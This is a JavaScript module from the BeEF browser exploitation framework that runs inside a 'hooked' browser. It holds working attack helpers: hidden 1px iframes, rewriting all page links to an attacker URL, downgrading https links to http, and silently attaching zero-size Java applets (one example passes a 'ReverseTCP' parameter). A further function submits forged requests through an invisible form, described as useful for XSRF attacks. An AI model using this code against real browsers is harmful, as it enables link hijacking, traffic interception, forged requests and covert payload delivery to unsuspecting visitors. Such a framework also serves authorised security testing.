//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.dom
 *
 * Provides functionality to manipulate the DOM.
 */
beef.dom = {
	
	/**
	 * Generates a random ID for HTML elements
	 * @param: {String} prefix: a custom prefix before the random id. defaults to "beef-"
	 * @return: generated id
	 */
	generateID: function(prefix) {
		return ((prefix == null) ? 'beef-' : prefix)+Math.floor(Math.random()*99999);
	},	
		
	/**
	 * Creates a new element but does not append it to the DOM.
	 * @param: {String} the name of the element.
	 * @param: {Literal Object} the attributes of that element.
	 * @return: the created element.
	 */
	createElement: function(type, attributes) {
		var el = document.createElement(type);
		
		for(index in attributes) {
			if(typeof attributes[index] == 'string') {
				el.setAttribute(index, attributes[index]);
			}
		}
		
		return el;
	},
	
	/**
	 * Removes element from the DOM.
	 * @param: {String or DOM Object} the target element to be removed.
	 */
	removeElement: function(el) {
		if (!beef.dom.isDOMElement(el))
		{
			el = document.getElementById(el);
		}
		try {
			el.parentNode.removeChild(el);
		} catch (e) { }
	},
	
	/**
	 * Tests if the object is a DOM element.
	 * @param: {Object} the DOM element.
	 * @return: true if the object is a DOM element.
	 */
	isDOMElement: function(obj) {
		return (obj.nodeType) ? true : false;
	},
	
	/**
	 * Creates an invisible iframe on the hook browser's page.
	 * @return: the iframe.
	 */
	createInvisibleIframe: function() {
		var iframe = this.createElement('iframe', {
				width: '1px',
				height: '1px',
				style: 'visibility:hidden;'
			});
		
		document.body.appendChild(iframe);
		
		return iframe;
	},
	
	/**
     * Create and iFrame element. In case it's create with POST method, the iFrame is automatically added to the DOM and submitted.
     * example usage in the code: beef.dom.createIframe('fullscreen', 'get', {'src':$j(this).attr('href')}, {}, null);
	 * @param: {String} type: can be 'hidden' or 'fullScreen'. defaults to normal
	 * @param: {String} method: can be 'GET' or 'POST'. defaults to GET
	 * @param: {Hash} params: list of params that will be sent in request.
	 * @param: {Hash} styles: css styling attributes, these are merged with the defaults specified in the type parameter
	 * @param: {Function} a callback function to fire once the iFrame has loaded
	 * @return: {Object} the inserted iFrame
	 */
	createIframe: function(type, method, params, styles, onload) {
		var css = {};
		var form_submit = (method.toLowerCase() == 'post') ? true : false; 
		if (form_submit && params['src'])
		{
			var form_action = params['src'];
			params['src'] = '';
		}
		if (type == 'hidden') { css = $j.extend(true, {'border':'none', 'width':'1px', 'height':'1px', 'display':'none', 'visibility':'hidden'}, styles); }
		if (type == 'fullscreen') { css = $j.extend(true, {'border':'none', 'background-color':'white', 'width':'100%', 'height':'100%', 'position':'absolute', 'top':'0px', 'left':'0px'}, styles); $j('body').css({'padding':'0px', 'margin':'0px'}); }
		var iframe = $j('<iframe />').attr(params).css(css).load(onload).prependTo('body');
		
		if (form_submit && form_action)
		{
			var id = beef.dom.generateID();
			$j(iframe).attr({'id': id, 'name':id});
			var form = beef.dom.createForm({'action':form_action, 'method':'get', 'target':id}, false);
			$j(form).prependTo('body').submit();
		}
		return iframe;
	},
	
	/**
     * Create a form element with the specified parameters, appending it to the DOM if append == true
	 * @param: {Hash} params: params to be applied to the form element
	 * @param: {Boolean} append: automatically append the form to the body
	 * @return: {Object} a form object
	 */
	createForm: function(params, append) {
		var form = $j('<form></form>').attr(params);
		if (append)
			$j('body').append(form);
		return form;
	},
	
	/**
	 * Get the location of the current page.
	 * @return: the location.
	 */
	getLocation: function() {
		return document.location.href;
	},
	
	/**
	 * Get links of the current page.
	 * @return: array of URLs.
	 */
	getLinks: function() {
		var linksarray = [];
		var links = document.links;
		for(var i = 0; i<links.length; i++) {
			linksarray = linksarray.concat(links[i].href)		
		};
		return linksarray
	},
	
	/**
	 * Rewrites all links matched by selector to url, also rebinds the click method to simply return true
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinks: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $j(sel).each(function() {
			if ($j(this).attr('href') != null)
			{
				$j(this).attr('href', url).click(function() { return true; });
			}
		}).length;
	},

	/**
     * Parse all links in the page matched by the selector, replacing old_protocol with new_protocol (ex.:https with http)
	 * @param: {String} old_protocol: the old link protocol to be rewritten
	 * @param: {String} new_protocol: the new link protocol to be written
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinksProtocol: function(old_protocol, new_protocol, selector) {

		var count = 0;
		var re = new RegExp(old_protocol+"://", "gi");
		var sel = (selector == null) ? 'a' : selector;

		$j(sel).each(function() {
			if ($j(this).attr('href') != null) {
				var url = $j(this).attr('href');
				if (url.match(re)) {
					$j(this).attr('href', url.replace(re, new_protocol+"://")).click(function() { return true; });
					count++;
				}
			}
		});

		return count;
	},

    /**
     *  Given an array of objects (key/value), return a string of param tags ready to append in applet/object/embed
     * @params: {Array} an array of params for the applet, ex.: [{'argc':'5', 'arg0':'ReverseTCP'}]
     * @return: {String} the parameters as a string ready to append to applet/embed/object tags (ex.: <param name='abc' value='test' />).
     */
    parseAppletParams: function(params){
         var result = '';
         for (i in params){
           var param = params[i];
           for(key in param){
              result += "<param name='" + key + "' value='" + param[key] + "' />";
           }
         }
        return result;
    },

    /**
     * Attach an applet to the DOM, using the best approach for differet browsers (object/applet/embed).
     * example usage in the code, using a JAR archive (recommended and faster):
     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://127.0.0.1:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
     * example usage in the code, using codebase:
     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://127.0.0.1:3000/', null, null);
     * @params: {String} id: reference identifier to the applet.
     * @params: {String} code: name of the class to be loaded. For example, beef.class.
     * @params: {String} codebase: the URL of the codebase (usually used when loading a single class for an unsigned applet).
     * @params: {String} archive: the jar that contains the code.
     * @params: {String} params: an array of additional params that the applet except.
     */
    attachApplet: function(id, name, code, codebase, archive, params) {
        var content = null;
        if (beef.browser.isIE()) {
            content = "" + // the classid means 'use the latest JRE available to launch the applet'
                "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
                "height='0' width='0' name='" + name + "'> " +
                "<param name='code' value='" + code + "' />";

            if (codebase != null) {
                content += "<param name='codebase' value='" + codebase + "' />"
            }else{
                content += "<param name='archive' value='" + archive + "' />";
            }
            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</object>";
        }
        if (beef.browser.isC() || beef.browser.isS() || beef.browser.isO()) {

            if (codebase != null) {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "codebase='" + codebase + "' " +
                    "height='0' width='0' name='" + name + "'>";
            } else {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "archive='" + archive + "' " +
                    "height='0' width='0' name='" + name + "'>";
            }

            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</applet>";
        }
        if (beef.browser.isFF()) {
            if (codebase != null) {
                content = "" +
                    "<embed id='" + id + "' code='" + code + "' " +
                    "type='application/x-java-applet' codebase='" + codebase + "' " +
                    "height='0' width='0' name='" + name + "'>";
            } else {
                content = "" +
                    "<embed id='" + id + "' code='" + code + "' " +
                    "type='application/x-java-applet' archive='" + archive + "' " +
                    "height='0' width='0' name='" + name + "'>";
            }

            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</embed>";
        }
        $j('body').append(content);
    },

    /**
     * Given an id, remove the applet from the DOM.
     * @params: {String} id: reference identifier to the applet.
     */
    detachApplet: function(id) {
        $j('#' + id + '').detach();
    },

    /**
     * Create an invisible iFrame with a form inside, and submit it. Useful for XSRF attacks delivered via POST requests.
     * @params: {String} action: the form action attribute, where the request will be sent.
     * @params: {String} method: HTTP method, usually POST.
     * @params: {Array} inputs: an array of inputs to be added to the form (type, name, value).
     *         example: [{'type':'hidden', 'name':'1', 'value':''} , {'type':'hidden', 'name':'2', 'value':'3'}]
     */
    createIframeXsrfForm: function(action, method, inputs){
        var iframeXsrf = beef.dom.createInvisibleIframe();

        var formXsrf = document.createElement('form');
        formXsrf.setAttribute('action', action);
        formXsrf.setAttribute('method', method);

        var input = null;
        for (i in inputs){
            var attributes = inputs[i];
            input = document.createElement('input');
                for(key in attributes){
                    input.setAttribute(key, attributes[key]);
                }
            formXsrf.appendChild(input);
        }
        iframeXsrf.contentWindow.document.body.appendChild(formXsrf);
        formXsrf.submit();

        return iframeXsrf;
    }

};

beef.regCmp('beef.dom');
